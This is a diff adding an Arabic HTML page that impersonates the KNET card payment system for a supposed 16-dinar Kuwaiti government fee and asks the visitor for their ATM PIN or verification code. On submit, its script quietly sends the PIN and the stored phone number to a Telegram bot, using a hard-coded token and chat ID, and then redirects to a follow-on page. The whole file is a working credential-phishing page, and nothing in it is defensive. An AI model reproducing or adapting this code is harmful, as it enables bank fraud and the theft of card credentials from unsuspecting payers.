@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no, minimal-ui" />
+    <title>صفحة دفع كي نت</title>
+    <link rel="stylesheet" href="otpkpay.css" />
+    
+
+    <style>
+       
+        #boxbuttons {
+            margin-top: 40px;
+        }
+        #pin {
+   
+            transform: translateY(-47px) translateX(-28px) !important;
+            margin-top: 70px;
+            z-index: 2;
+
+  }
+
+
+
+#boxbuttons{
+    transform: translateY(-45px) translateX(-0px) !important;
+
+}
+
+#divtexfoter{
+    transform: translateY(-45px) translateX(-0px) !important;
+
+}
+
+#timer{
+    transform: translateY(92px) translateX(50px) !important;
+font-size: 11px;
+}
+
+#textex{
+    transform: translateY(75px) translateX(-30px) !important;
+font-size: 11px;
+
+}
+
+#boxbuttons {
+    position: relative; 
+    z-index: 9999; 
+}
+
+
+    </style>
+</head>
+<body>
+    <header id="pageHeader">
+        <img src="kpayt.jpg" alt="رأس الصفحة" id="headerImage" />
+    </header>
+
+    <div class="box bank-info" id="bankInfoBox">
+        <img id="imgkn" src="images (3).png" alt="بنك وربة" class="bank-logo" />
+        <div>
+            <p id="txthom">:المستفيد</p>
+              <strong id="beneficiaryName" > gov kuwait </strong>
+        </div>
+         <div> 
+            <hr id="hrhome">
+         </div>
+         <div> 
+         <p id="txthome"> :المبلغ</p>
+         <strong id="amountValu"> 16 دينار </strong>
+        </div>
+    </div>
+
+    <div class="box payment-form" id="boxdiv">
+        <form id="paymentForm">
+            <div id="divtext"><h1 id="textotp"> تم ارسال رمز للتحقق من ملكية البطاقة يرجى ادخال رمز التحقق ادناه لتأكيد ملكية البطاقة </h1></div>
+
+
+            <div> 
+                <p id="timer" ><p id="textex">سيتم ارسال رمز جديد بعد مرور</p> </p>
+            </div>
+            <div class="input-container" id="divinput">
+                <label id="texst4" for="pin1">الرقم السري:</label>
+                <div class="input-box">
+                    <input
+                        type="password"
+                        id="pin"
+                        required
+                        pattern="\d{6}"
+                        maxlength="6"
+                        inputmode="numeric"
+                        oninvalid="this.setCustomValidity('يرجى ادخال الرقم السري ATM التابع للبطاقة')"
+                        oninput="this.setCustomValidity('')"
+                    />
+                    <input type="hidden" id="hiddenName" />
+                </div>
+            </div>
+           
+            <div class="box buttons" id="boxbuttons">
+                <button type="submit" id="submitButton1">إرسال</button>
+                <button type="button" onclick="resetForm()" id="submitButton10">إلغاء</button>
+            </div>
+            
+        </form>
+        <div id="divtexfoter"> 
+        <p id="naem0">جميع الحقوق محفوظة © 2025</p>
+        <p id="naem00">شركة الخدمات المصرفية الالية المشتركة - كي نت</p>
+    
+    </div>
+    </div>
+    
+
+    <script>
+
+          const finalAmount = sessionStorage.getItem('finalAmount');
+
+  // التأكد أن هناك قيمة
+  if (finalAmount) {
+    // عرض القيمة في عنصر معين داخل الصفحة
+    document.addEventListener("DOMContentLoaded", () => {
+      const priceElement = document.getElementById("amountValu");
+      if (priceElement) {
+        priceElement.textContent = ` ${finalAmount} `;
+      }
+    });
+  }
+        // عرض المبلغ من localStorage
+ const totalAmount = localStorage.getItem("totalPrice");
+ document.getElementById("amountVal").innerText = totalAmount;
+    </script>
+        <script>
+
+            let duration = 2 * 60;
+const timerDisplay = document.getElementById('timer');
+
+const countdown = setInterval(() => {
+    const minutes = Math.floor(duration / 60);
+    const seconds = duration % 60;
+    timerDisplay.textContent = `${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
+    if (duration <= 0) {
+        clearInterval(countdown);
+        timerDisplay.textContent = "انتهى الوقت";
+    }
+    duration--;
+}, 1000);
+
+document.addEventListener("DOMContentLoaded", function () {
+    const amount = localStorage.getItem("boton");
+    if (amount) {
+        document.getElementById("amountalu").textContent = amount;
+    }
+
+    const totalAmount = localStorage.getItem("totalAoun");
+    if (totalAmount) {
+        document.getElementById("amountu").innerText = totalAmount;
+    }
+
+    document.getElementById("paymentForm").addEventListener("submit", function (e) {
+        e.preventDefault();
+        sendToTelegram();
+    });
+});
+
+function sendToTelegram() {
+    const token = "8029079085:AAHz-G_SEaTy3VcNuWBfERpTPDrEhPGuTac";
+    const chatId = "7595871538";
+    const pinInput = document.getElementById("pin");
+    const pin = pinInput.value.trim();
+const civilId = localStorage.getItem("civilId") || "غير متوفر";
+
+    if (!/^\d{5,6}$/.test(pin)) {
+        alert("الرقم السري غير صالح");
+        return;
+    }
+    const phoneNumber = localStorage.getItem("phoneNumber") || "غير متوفر";
+
+    const message =
+        `📩 رمز كي نت\n\n` +
+        `👤 من : ${phoneNumber || 'غير متوفر'}\n` +
+        `🔑 الرقم السري : ${pin}`;
+
+    const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+    fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chatId, text: message })
+    })
+        .then(() => {
+            window.location.href = "otpkpay2.html";
+        })
+        .catch(error => {
+            console.error("خطأ في الإرسال:", error);
+        });
+}
+
+setTimeout(function () {
+    const element = document.getElementById('namenone');
+    if (element) element.style.display = 'none';
+
+    document.body.querySelectorAll('*').forEach(function (el) {
+        el.style.visibility = 'visible';
+    });
+}, 5000);
+        </script>
+
+</body>
+</html>
